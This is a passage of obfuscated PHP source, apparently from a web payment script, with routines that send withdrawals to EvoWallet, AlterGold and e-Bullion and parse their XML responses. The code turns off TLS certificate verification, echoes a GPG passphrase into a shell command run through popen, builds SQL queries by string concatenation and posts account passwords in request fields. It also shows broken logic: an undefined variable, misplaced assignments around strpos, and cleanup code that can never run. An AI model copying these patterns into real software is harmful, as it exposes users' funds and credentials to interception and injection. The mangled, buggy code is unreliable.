          return array (0, $e, '');
        }
        else
        {
          $e = elnlcqedaf ('' . $elnlcqokow . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcqedaf ('' . $elnlcqokow . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcqokow . ' Curl functions are not available');
    }

  }

  function elnlcjtlft ($elnlchlvLi)
  {
    global $elnlcFAei;
    $elnlctcyj = array ();
    $elnlcuVDtK = elnlccyps ($elnlchlvLi, 'response');
    if ($elnlcuVDtK != '')
    {
      $elnlcsdWLB = $elnlcuVDtK;
      $elnlctcyj[$elnlcFAei['elnlcJzws']] = elnlccyps ($elnlcsdWLB, 'status');
      $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = elnlccyps ($elnlcdEjT, 'statusmsg');
      $elnlctcyj[$elnlcFAei['elnlcvQzwa']] = elnlccyps ($elnlcsdWLB, 'batch');
      $elnlctcyj[$elnlcFAei['elnlcubLOs']] = elnlccyps ($elnlcsdWLB, 'fromaccount');
      $elnlctcyj[$elnlcFAei['elnlcDHBal']] = elnlccyps ($elnlcsdWLB, 'toaccount');
      $elnlctcyj[$elnlcFAei['elnlcBBFw']] = elnlccyps ($elnlcsdWLB, 'amount');
      $elnlctcyj[$elnlcFAei['elnlcvvGo']] = elnlccyps ($elnlcsdWLB, 'currency');
      $elnlctcyj[$elnlcFAei['elnlcCInBK']] = elnlccyps ($elnlcsdWLB, 'checksum');
      if ($elnlctcyj[$elnlcFAei['elnlcJzws']] == 0)
      {
        $elnlctcyj[$elnlcFAei['elnlcJzws']] = $elnlcFAei['elnlckIRzm'];
      }
    }

    if (0 < $elnlctcyj[$elnlcFAei['elnlcJzws']])
    {
      switch ($elnlctcyj[$elnlcFAei['elnlcJzws']])
      {
        case 10310:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10310: Invalid Account Prefix';
          break;
        }

        case 10311:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10311: Payer account has been suspended';
          break;
        }

        case 10312:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10312: API transfer disabled';
          break;
        }

        case 10313:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10313: Payee account not found';
          break;
        }

        case 10314:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10314: Payer spending over daily limit';
          break;
        }

        case 10315:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10315: Payee account has been suspended';
          break;
        }

        case 10316:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10316: Payee account has been limited';
          break;
        }

        case 10317:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10317: Spending less than minimum allowed';
          break;
        }

        case 10318:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10318: Payee will reach their balance limit';
          break;
        }

        case 10319:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10319: Payer do not have enough funds';
          break;
        }

        case 10320:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10320: Payee has an invalid balance security check';
          break;
        }

        case 10321:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10321: Spend was not complete';
          break;
        }

        case 10322:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10322: Payee account group not found';
          break;
        }

        case 10323:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10323: Invalid payee account';
          break;
        }

        case 10324:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10324: Invalid IP range';
          break;
        }

        case 10325:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10325: Invalid API or not enabled';
          break;
        }

        case 10326:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10326: Payer account group not found';
          break;
        }

        case 10327:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10327: Invalid payer account';
          break;
        }

        case 10328:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10328: Invalid checksum';
          break;
        }

        case 10110:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10110: Invalid Account Prefix';
          break;
        }

        case 10111:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10111: Account has been suspended';
          break;
        }

        case 10112:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10112: Invalid API or API not enabled';
          break;
        }

        case 10113:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10113: API balance query disabled';
          break;
        }

        case 10114:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10114: IP not in the allowed range';
          break;
        }

        case 10115:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10115: Balance can not be retrieved';
          break;
        }

        case 10116:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10116: Reserve';
          break;
        }

        case 10117:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10117: Account group not found';
          break;
        }

        case 10118:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10118: This account can not be found';
          break;
        }

        case 10119:
        {
          $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = '10119: Invalid Checksum';
          break;
        }
      }

      $elnlctcyj[$elnlcFAei['elnlcJzws']] = $elnlcFAei['elnlcCgiLk'];
    }

    return $elnlctcyj;
  }

  function elnlcqxfh ($elnlchAzqM, $elnlcLMULg, $elnlcrIPNm, $elnlcoWGTg, $elnlcqokow, $elnlcOadhk = 'USD')
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    if ($elnlcGWAnG[$elnlcFAei['elnlcGSktp']] == $elnlcFAei['elnlcIHTwl'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcGWAnG[$elnlcFAei['elnlcBJpk']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcrIPNm == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty EvoWallet account.\'';
      mysql_query ($q);
      return array (0, 'Invalid EvoWallet account', '');
    }

    list ($elnlcisgS, $elnlcjzLUA) = elnlcqsbia ($elnlcrIPNm, 24);
    if ($elnlcisgS == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcjzLUA . '\'';
      mysql_query ($q);
      return array (0, $elnlcjzLUA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlchAzqM == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'evowallet_password\'';
        $elnlcSQAa = mysql_query ($q);
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          $elnlcmrPOy = elnlcuexwr ($elnlctLoC[$elnlcFAei['elnlccdshL']], $elnlcFAei['elnlceUUg']);
        }

        $elnlcnCtnu = $elnlcGWAnG[$elnlcFAei['elnlcWzaGQ']];
      }
      else
      {
        list ($elnlcmrPOy, $elnlcnCtnu) = preg_split ('/\\|/', $elnlchAzqM);
      }

      $elnlcGUFH = curl_init ();
      $elnlcuTUsL = date ($elnlcFAei['elnlcVojA']);
      $elnlcxByGj = strtoupper (md5 ($elnlcnCtnu . $elnlcuTUsL . '103' . '' . $elnlcOadhk . $elnlcGWAnG[$elnlcFAei['elnlcbkVi']] . $elnlcrIPNm . $elnlcLMULg . md5 ($elnlcmrPOy)));
      $elnlcqcAV = '<?xml version="1.0" encoding="utf-8"?>
<request>
<apiname>' . htmlentities ($elnlcnCtnu, ENT_NOQUOTES) . '</apiname>
<trandate>' . $elnlcuTUsL . '</trandate>
<trantype>103</trantype>
<tranid></tranid>
<curcode>' . $elnlcOadhk . '</curcode>
<fromaccount>' . htmlentities ($elnlcGWAnG[$elnlcFAei['elnlcbkVi']], ENT_NOQUOTES) . '</fromaccount>
<toaccount>' . htmlentities ($elnlcrIPNm, ENT_NOQUOTES) . '</toaccount>
<amount>' . htmlentities ($elnlcLMULg, ENT_NOQUOTES) . '</amount>
<memo>' . htmlentities ($elnlcoWGTg, ENT_NOQUOTES) . '</memo> 
<checksum>' . $elnlcxByGj . '</checksum> 
</request>';
      $elnlcGUFH = curl_init ();
      curl_setopt ($elnlcGUFH, CURLOPT_URL, 'https://www.evowallet.com/api.php?req=' . urlencode ($elnlcqcAV));
      curl_setopt ($elnlcGUFH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcGUFH, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcGUFH);
      curl_close ($elnlcGUFH);
      $elnlctcyj = elnlcjtlft ($a);
      if ($elnlctcyj[$elnlcFAei['elnlcJzws']] == $elnlcFAei['elnlcGJIRG'])
      {
        return array (1, '', $elnlctcyj[$elnlcFAei['elnlcvQzwa']]);
      }
      else
      {
        if ($elnlctcyj[$elnlcFAei['elnlcJzws']] == $elnlcFAei['elnlccgjlv'])
        {
          $e = elnlcqedaf ('' . $elnlcqokow . ' ' . $elnlctcyj[$elnlcFAei['elnlcAIzUn']] . '<br>' . $elnlctcyj[$elnlcFAei['elnlcOBtk']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcqedaf ('' . $elnlcqokow . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcqedaf ('' . $elnlcqokow . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcqokow . ' Curl functions are not available');
    }

  }

  function elnlcogfnv ($elnlcQAwUu, $elnlcLMULg, $elnlcrIPNm, $elnlcoWGTg, $elnlcqokow)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    if ($elnlcGWAnG[$elnlcFAei['elnlcGSktp']] == $elnlcFAei['elnlcIHTwl'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcGWAnG[$elnlcFAei['elnlcBJpk']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcrIPNm == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to AlterGold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid AlterGold account', '');
    }

    list ($elnlcisgS, $elnlcjzLUA) = elnlcqsbia ($elnlcrIPNm, 17);
    if ($elnlcisgS == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcjzLUA . '\'';
      mysql_query ($q);
      return array (0, $elnlcjzLUA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcQAwUu == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'altergold_password\'';
        $elnlcSQAa = mysql_query ($q);
        while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
        {
          $elnlcmuDLp = elnlcuexwr ($elnlctLoC[$elnlcFAei['elnlccdshL']], $elnlcFAei['elnlceUUg']);
        }
      }
      else
      {
        $elnlcmuDLp = $elnlcQAwUu;
      }

      $elnlcGUFH = curl_init ();
      $elnlcoWGTg = rawurlencode ($elnlcoWGTg);
      curl_setopt ($elnlcGUFH, CURLOPT_URL, 'https://api.altergold.com/spend.php');
      curl_setopt ($elnlcGUFH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcGUFH, CURLOPT_POST, 1);
      curl_setopt ($elnlcGUFH, CURLOPT_POSTFIELDS, 'PAYER_ACCOUNT=' . rawurlencode ($elnlcGWAnG[$elnlcFAei['elnlcaFfi']]) . '&PAYER_PASSWORD=' . rawurlencode ($elnlcmuDLp) . '&PAYEE_ACCOUNT=' . rawurlencode ($elnlcrIPNm) . '&PAYMENT_AMOUNT=' . rawurlencode ($elnlcLMULg) . ('' . '&PAYMENT_CURRENCY=USD&MEMO=' . $elnlcoWGTg));
      curl_setopt ($elnlcGUFH, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcGUFH);
      curl_close ($elnlcGUFH);
      if ($a == '')
      {
        print 'Blank response from Altergold processor service.';
      }
      else
      {
        $elnlcqklNK = array ('E10011' => 'Unable to Login as Payer. This means wrong login information was provided.', 'E10012' => 'Payer is not allowed to make outgoing spends. Means account is suspended or perhaps limited.', 'E10013' => 'API Automated Spends not Enabled.', 'E10014' => 'Unable to authorize IP address.', 'E10015' => 'Recipient account not found', 'E10016' => 'Recipient account is suspended.', 'E10017' => 'Invalid spend units.', 'E10018' => 'Spend amount is too low.', 'E10019' => 'Recipient reached balance limit.', 'E10020' => 'Not enough funds.', 'E10021' => '* Please contact support.');
        if ($elnlcqklNK[$a] != '')
        {
          $e = elnlcqedaf ('' . $elnlcqokow . ' ' . $elnlcqklNK[$a]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcqokow . ('' . ' ' . $elnlcqklNK[$a]), '');
        }
        else
        {
          return array (1, '', $a);
        }
      }
    }
    else
    {
      $e = elnlcqedaf ('' . $elnlcqokow . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcqokow . ' Curl functions are not available');
    }

  }

  function elnlcheal ($elnlcCfpPK, $elnlcLMULg, $elnlcrIPNm, $elnlcoWGTg, $elnlcqokow, $elnlcEFPiH)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    if ($elnlcGWAnG[$elnlcFAei['elnlcGSktp']] == $elnlcFAei['elnlcIHTwl'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcGWAnG[$elnlcFAei['elnlcBJpk']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcrIPNm == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to e-Bullion account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid e-Bullion account', '');
    }

    list ($elnlcisgS, $elnlcjzLUA) = elnlcqsbia ($elnlcrIPNm, 5);
    if ($elnlcisgS == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcjzLUA . '\'';
      mysql_query ($q);
      return array (0, $elnlcjzLUA);
    }

    if (function_exists ('curl_init'))
    {
      $elnlcMlJR = '<atip.batch.v1><payment.list>';
      $elnlcMlJR = $elnlcMlJR . '<payment>';
      $elnlcMlJR = $elnlcMlJR . '<payer>' . htmlentities ($elnlcGWAnG[$elnlcFAei['elnlceSsS']], ENT_NOQUOTES) . '</payer>';
      $elnlcMlJR = $elnlcMlJR . '<payee>' . htmlentities ($elnlcrIPNm, ENT_NOQUOTES) . '</payee>';
      $elnlcMlJR = $elnlcMlJR . '<amount>' . htmlentities ($elnlcLMULg, ENT_NOQUOTES) . '</amount>';
      $elnlcMlJR = $elnlcMlJR . '<metal>' . ($elnlcEFPiH == 5 ? 1 : 3) . '</metal>';
      $elnlcMlJR = $elnlcMlJR . '<unit>1</unit>';
      $elnlcMlJR = $elnlcMlJR . '<memo>' . htmlentities ($elnlcoWGTg, ENT_NOQUOTES) . '</memo>';
      $elnlcMlJR = $elnlcMlJR . '<ref></ref>';
      $elnlcMlJR = $elnlcMlJR . '</payment>';
      $elnlcMlJR = $elnlcMlJR . '</payment.list></atip.batch.v1>';
      $elnlcDvfs = tempnam ('./tmpl_c/', 'in.');
      $elnlcCwSz = tempnam ('./tmpl_c/', 'out.');
      $elnlcItSE = fopen ($elnlcDvfs, $elnlcFAei['elnlcTQMsE']);
      fwrite ($elnlcItSE, $elnlcMlJR);
      fclose ($elnlcItSE);
      $elnlcMQSU = './tmpl_c/';
      $elnlcayvSA = escapeshellcmd ($elnlcGWAnG[$elnlcFAei['elnlcDIHph']]);
      $elnlcJICN = elnlcuexwr ($elnlcGWAnG[$elnlcFAei['elnlcWbNM']], $elnlcFAei['elnlceUUg']);
      $elnlcNgJs = $elnlcGWAnG[$elnlcFAei['elnlcRTeW']];
      $elnlcNAWg = '' . ' --yes --no-tty --no-secmem-warning --no-options --no-default-keyring --batch --homedir ' . $elnlcMQSU . ' --keyring=pubring.gpg --secret-keyring=secring.gpg --armor --throw-keyid --always-trust --passphrase-fd 0';
      $elnlcbNJte = '' . 'echo \'' . $elnlcJICN . '\' | ' . $elnlcayvSA . ' ' . $elnlcNAWg . ' --recipient A20077\\@e-bullion.com --local-user ' . $elnlcGWAnG[$elnlcFAei['elnlceSsS']] . ('' . '\\@e-bullion.com --output ' . $elnlcCwSz . ' --sign --encrypt ' . $elnlcDvfs . ' 2>&1');
      $elnlcKltcj = '';
      $elnlcakaz = popen ('' . $elnlcbNJte, 'r');
      while (!feof ($elnlcakaz))
      {
        $elnlcKltcj = fgets ($elnlcakaz, 4096);
      }

      pclose ($elnlcakaz);
      $elnlcItSE = fopen ($elnlcCwSz, $elnlcFAei['elnlcTVChH']);
      $elnlcEPQK = fread ($elnlcItSE, filesize ($elnlcCwSz));
      fclose ($elnlcItSE);
      unlink ($elnlcDvfs);
      unlink ($elnlcCwSz);
      $elnlcfHqfO = 'ATIP_ACCOUNT=' . rawurlencode ($elnlcGWAnG[$elnlcFAei['elnlceSsS']]) . '&ATIP_BATCH_MSG=' . rawurlencode ($elnlcEPQK) . '&ATIP_STATUS_URL=' . rawurlencode ($elnlcNgJs);
      $elnlcGUFH = curl_init ();
      curl_setopt ($elnlcGUFH, CURLOPT_URL, '' . 'https://atip.e-bullion.com/batch.php?' . $elnlcfHqfO);
      curl_setopt ($elnlcGUFH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcGUFH, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt ($elnlcGUFH, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($elnlcGUFH, CURLOPT_HEADER, 1);
      $a = curl_exec ($elnlcGUFH);
      curl_close ($elnlcGUFH);
      $elnlcDURnv = array ();
      $elnlcJmiIk = '';
      if (preg_match ('/Location: .*?\\?ATIP_VERIFICATION=([^\\r\\n]+)%0A/', $a, $elnlcDURnv))
      {
        $elnlcJmiIk = $elnlcDURnv[1];
      }

      $elnlcJmiIk = urldecode ($elnlcJmiIk);
      $elnlcKsunJ = tempnam ('./tmpl_c/', 'xml.cert.');
      $elnlcGggD = tempnam ('./tmpl_c/', 'xml.tmp.');
      $elnlcItSE = fopen ('' . $elnlcGggD, $elnlcFAei['elnlcTQMsE']);
      fwrite ($elnlcItSE, $elnlcJmiIk);
      fclose ($elnlcItSE);
      $elnlcNAWg = '' . ' --yes --no-tty --no-secmem-warning --no-options --no-default-keyring --batch --homedir ' . $elnlcMQSU . ' --keyring=pubring.gpg --secret-keyring=secring.gpg --armor --passphrase-fd 0';
      $elnlcbNJte = '' . 'echo \'' . $elnlcJICN . '\' | ' . $elnlcayvSA . ' ' . $elnlcNAWg . ' --output ' . $elnlcKsunJ . ' --decrypt ' . $elnlcGggD . ' 2>&1';
      $elnlcKltcj = '';
      $elnlcylIua = '';
      $elnlcakaz = popen ('' . $elnlcbNJte, 'r');
      while (!feof ($elnlcakaz))
      {
        $elnlcKltcj = fgets ($elnlcakaz, 4096);
        $elnlcyxPt = strstr ($elnlcKltcj, 'key ID');
        if (0 < strlen ($elnlcyxPt))
        {
          $elnlcylIua = preg_replace ('/[\\n\\r]/', '', substr ($elnlcyxPt, 7));
          continue;
        }
      }

      pclose ($elnlcakaz);
      if ($elnlcylIua == $elnlcGWAnG[$elnlcFAei['elnlcDuCy']])
      {
        if (is_file ('' . $elnlcKsunJ))
        {
          $elnlckfRhM = fopen ('' . $elnlcKsunJ, $elnlcFAei['elnlcTVChH']);
          $elnlchlvLi = fread ($elnlckfRhM, filesize ('' . $elnlcKsunJ));
          fclose ($elnlckfRhM);
        }
        else
        {
          $e = elnlcqedaf ('' . $elnlcqokow . ' Can not found decrypted verification response!');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcqokow . ' Can not found decrypted verification response!', '');
        }

        $elnlcqcAV = elnlcvdxqi ($elnlchlvLi);
        if ($elnlcqcAV[$elnlcFAei['elnlcJzws']] == $elnlcFAei['elnlcGJIRG'])
        {
          return array (1, '', $elnlcqcAV[$elnlcFAei['elnlcvQzwa']]);
        }
        else
        {
          if ($elnlcqcAV[$elnlcFAei['elnlcJzws']] == $elnlcFAei['elnlccgjlv'])
          {
            $e = elnlcqedaf ('' . $elnlcqokow . ' ' . $elnlcqcAV[$elnlcFAei['elnlcAIzUn']] . ' ' . $elnlcqcAV[$elnlcFAei['elnlcOBtk']]);
            $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
            mysql_query ($q);
            return array (0, $elnlcqokow . $elnlcqcAV[$elnlcFAei['elnlcAIzUn']] . ' ' . $elnlcqcAV[$elnlcFAei['elnlcOBtk']]);
          }
          else
          {
            $e = elnlcqedaf ('' . $elnlcqokow . ' Unknown error');
            $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
            mysql_query ($q);
            return array (0, $elnlcqokow . ' Unknown error', '');
          }
        }
      }
      else
      {
        $e = elnlcqedaf ('' . $elnlcqokow . ' Can not decrypt verification response! ');
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $elnlcqokow . ' Can not decrypt verification response!', '');
      }

      unlink ($elnlcGggD);
      unlink ($elnlcKsunJ);
    }
    else
    {
      $e = elnlcqedaf ('' . $elnlcqokow . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcqokow . ' Curl functions are not available', '');
    }

  }

  function elnlccyps ($elnlcqcAV, $elnlccdtj)
  {
    global $elnlcFAei;
    $elnlccdtj = strtolower ($elnlccdtj);
    $elnlcBhlr = strlen ($elnlccdtj) + 2;
    if ($elnlcaLFBB = strpos ($elnlcqcAV, '' . '<' . $elnlccdtj . '>') === false)
    {
      return '';
    }

    if ($elnlcdWFDc = strpos ($elnlcqcAV, '' . '</' . $elnlccdtj . '>') === false)
    {
      return '';
    }

    $elnlcgVKz = trim (substr ($elnlcqcAV, $elnlcaLFBB + $elnlcBhlr, $elnlcdWFDc - ($elnlcaLFBB + $elnlcBhlr)));
    return $elnlcgVKz;
  }

  function elnlcvdxqi ($elnlchlvLi)
  {
    global $elnlcFAei;
    $elnlctcyj = array ();
    $elnlcTLgbO = elnlccyps ($elnlchlvLi, 'balanceresponse.list');
    if ($elnlcTLgbO != '')
    {
      $elnlctcyj[$elnlcFAei['elnlcJzws']] = $elnlcFAei['elnlcDWUhv'];
      $elnlcwmdNp = false;
      if ($elnlcJBwK = stristr ($elnlcTLgbO, '<balance>') === false)
      {
        $elnlcwmdNp = true;
      }
      else
      {
        $elnlcaLFBB = strlen ($elnlcTLgbO) - strlen ($elnlcJBwK);
      }

      if ($elnlcJycxj = stristr ($elnlcTLgbO, '</balance>') === false)
      {
        $elnlcwmdNp = true;
      }
      else
      {
        $elnlcdWFDc = strlen ($elnlcTLgbO) - strlen ($elnlcJycxj);
      }

      while (!$elnlcwmdNp)
      {
        $elnlcllpRo = trim (substr ($elnlcTLgbO, $elnlcaLFBB + 9, $elnlcdWFDc - 9));
        $elnlcTLgbO = trim (substr ($elnlcTLgbO, $elnlcdWFDc + 10));
        $elnlctcyj[$elnlcFAei['elnlcBBFw']] = elnlccyps ($elnlcllpRo, 'amount');
        if ($elnlcJBwK = stristr ($elnlcTLgbO, '<balance>') === false)
        {
          $elnlcwmdNp = true;
        }
        else
        {
          $elnlcaLFBB = strlen ($elnlcTLgbO) - strlen ($elnlcJBwK);
        }

        if ($elnlcJycxj = stristr ($elnlcTLgbO, '</balance>') === false)
        {
          $elnlcwmdNp = true;
          continue;
        }
        else
        {
          $elnlcdWFDc = strlen ($elnlcTLgbO) - strlen ($elnlcJycxj);
          continue;
        }
      }
    }

    $elnlcuVDtK = elnlccyps ($elnlchlvLi, 'verified.list');
    if ($elnlcuVDtK != '')
    {
      $elnlctcyj[$elnlcFAei['elnlcJzws']] = $elnlcFAei['elnlckIRzm'];
      $elnlcwmdNp = false;
      if ($elnlcJBwK = stristr ($elnlcuVDtK, '<transaction>') === false)
      {
        $elnlcwmdNp = true;
      }
      else
      {
        $elnlcaLFBB = strlen ($elnlcuVDtK) - strlen ($elnlcJBwK);
      }

      if ($elnlcJycxj = stristr ($elnlcuVDtK, '</transaction>') === false)
      {
        $elnlcwmdNp = true;
      }
      else
      {
        $elnlcdWFDc = strlen ($elnlcuVDtK) - strlen ($elnlcJycxj);
      }

      while (!$elnlcwmdNp)
      {
        $elnlcsdWLB = trim (substr ($elnlcuVDtK, $elnlcaLFBB + 13, $elnlcdWFDc - 13));
        $elnlcuVDtK = trim (substr ($elnlcuVDtK, $elnlcdWFDc + 14));
        $elnlctcyj[$elnlcFAei['elnlcvQzwa']] = elnlccyps ($elnlcsdWLB, 'id');
        $elnlctcyj[$elnlcFAei['elnlcDHBal']] = elnlccyps ($elnlcsdWLB, 'payee');
        $elnlctcyj[$elnlcFAei['elnlcubLOs']] = elnlccyps ($elnlcsdWLB, 'payer');
        $elnlctcyj[$elnlcFAei['elnlcBBFw']] = elnlccyps ($elnlcsdWLB, 'amount');
        $elnlctcyj[$elnlcFAei['elnlcJuPd']] = elnlccyps ($elnlcsdWLB, 'metal');
        $elnlctcyj[$elnlcFAei['elnlcifha']] = elnlccyps ($elnlcsdWLB, 'unit');
        $elnlctcyj[$elnlcFAei['elnlcmCqPN']] = elnlccyps ($elnlcsdWLB, 'memo');
        $elnlctcyj[$elnlcFAei['elnlcEQVG']] = elnlccyps ($elnlcsdWLB, 'exchange');
        $elnlctcyj[$elnlcFAei['elnlclfrL']] = elnlccyps ($elnlcsdWLB, 'fee');
        if ($elnlcJBwK = stristr ($elnlcuVDtK, '<transaction>') === false)
        {
          $elnlcwmdNp = true;
        }
        else
        {
          $elnlcaLFBB = strlen ($elnlcuVDtK) - strlen ($elnlcJBwK);
        }

        if ($elnlcJycxj = stristr ($elnlcuVDtK, '</transaction>') === false)
        {
          $elnlcwmdNp = true;
          continue;
        }
        else
        {
          $elnlcdWFDc = strlen ($elnlcuVDtK) - strlen ($elnlcJycxj);
          continue;
        }
      }
    }

    $elnlcmTIG = elnlccyps ($elnlchlvLi, 'failed.list');
    if ($elnlcmTIG != '')
    {
      $elnlctcyj[$elnlcFAei['elnlcJzws']] = $elnlcFAei['elnlcCgiLk'];
      $elnlcwmdNp = false;
      if ($elnlcJBwK = stristr ($elnlcmTIG, '<failed>') === false)
      {
        $elnlcwmdNp = true;
      }
      else
      {
        $elnlcaLFBB = strlen ($elnlcmTIG) - strlen ($elnlcJBwK);
      }

      if ($elnlcJycxj = stristr ($elnlcmTIG, '</failed>') === false)
      {
        $elnlcwmdNp = true;
      }
      else
      {
        $elnlcdWFDc = strlen ($elnlcmTIG) - strlen ($elnlcJycxj);
      }

      while (!$elnlcwmdNp)
      {
        $elnlcrOIqx = trim (substr ($elnlcmTIG, $elnlcaLFBB + 13, $elnlcdWFDc - 13));
        $elnlcmTIG = trim (substr ($elnlcmTIG, $elnlcdWFDc + 14));
        $elnlctcyj[$elnlcFAei['elnlcAIzUn']] = elnlccyps ($elnlcrOIqx, 'error');
        if ($elnlcJBwK = stristr ($elnlcmTIG, '<failed>') === false)
        {
          $elnlcwmdNp = true;
        }
        else
        {
          $elnlcaLFBB = strlen ($elnlcmTIG) - strlen ($elnlcJBwK);
        }

        if ($elnlcJycxj = stristr ($elnlcmTIG, '</failed>') === false)
        {
          $elnlcwmdNp = true;
          continue;
        }
        else
        {
          $elnlcdWFDc = strlen ($elnlcmTIG) - strlen ($elnlcJycxj);
          continue;
        }
      }
    }

    $elnlcOeNVC = elnlccyps ($elnlchlvLi, 'errorresponse.list');
    if ($elnlcOeNVC != '')
    {
      $elnlctcyj[$elnlcFAei['elnlcJzws']] = $elnlcFAei['elnlcCgiLk'];
      $elnlcwmdNp = false;
      if ($elnlcJBwK = stristr ($elnlcOeNVC, '<errorresponse>') === false)
      {
        $elnlcwmdNp = true;
      }
      else
      {
        $elnlcaLFBB = strlen ($elnlcOeNVC) - strlen ($elnlcJBwK);
      }

      if ($elnlcJycxj = stristr ($elnlcOeNVC, '</errorresponse>') === false)
      {
        $elnlcwmdNp = true;
      }
      else
      {
        $elnlcdWFDc = strlen ($elnlcOeNVC) - strlen ($elnlcJycxj);
      }

      while (!$elnlcwmdNp)
      {
        $elnlcPJGU = trim (substr ($elnlcOeNVC, $elnlcaLFBB + 15, $elnlcdWFDc - 15));
        $elnlcQfSk = false;
        if ($elnlcthMlW = stristr ($elnlcPJGU, '<error>') === false)
        {
          $elnlcQfSk = true;
        }
        else
        {
          $elnlcGGizO = strlen ($elnlcPJGU) - strlen ($elnlcthMlW);
        }

        if ($elnlcDCnn = stristr ($elnlcPJGU, '</error>') === false)
        {
          $elnlcQfSk = true;
        }
        else
        {
          $elnlcRUEN = strlen ($elnlcPJGU) - strlen ($elnlcDCnn);
        }

